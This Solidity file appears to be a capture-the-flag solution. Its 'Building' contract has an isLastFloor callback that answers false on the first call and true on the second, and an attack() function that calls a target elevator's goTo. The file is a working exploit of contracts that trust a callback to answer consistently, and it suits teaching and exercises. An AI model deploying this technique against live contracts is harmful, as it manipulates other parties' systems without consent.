// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    uint256 public counter;
    address private target;

    constructor (address _target) {
        target = _target;
    }

    function isLastFloor(uint256) public returns (bool) {
        counter += 1;
        if (counter % 2 != 0) {
            return false;
        }
        else {
            return true;
        }
    }

    function attack() public {
        IElevator(target).goTo(1);
    }

}
